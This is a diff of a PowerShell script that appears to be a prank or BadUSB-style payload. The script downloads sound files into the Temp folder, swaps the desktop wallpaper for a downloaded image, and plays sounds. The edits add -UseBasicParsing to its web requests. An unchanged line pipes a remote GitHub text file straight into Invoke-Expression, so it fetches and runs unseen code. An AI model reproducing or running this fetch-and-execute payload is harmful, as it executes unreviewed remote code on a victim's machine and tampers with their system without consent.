@@ -1,6 +1,6 @@
-Set-Location $env:Temp; Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound1.wav -O sound1.wav
-Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound2.wav -O sound2.wav
-Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound3.wav -O sound3.wav
+Set-Location $env:Temp; Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound1.wav -O sound1.wav -UseBasicParsing
+Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound2.wav -O sound2.wav -UseBasicParsing
+Invoke-WebRequest https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/sound3.wav -O sound3.wav -UseBasicParsing
 
 irm https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/add_script.txt | iex
 
@@ -82,7 +82,7 @@ function set-wall($imgPath){
 }
 
 function download($link1){
-Invoke-WebRequest $link1 -O img.jpg
+Invoke-WebRequest $link1 -O img.jpg -UseBasicParsing
 }
 
 function sound($y){
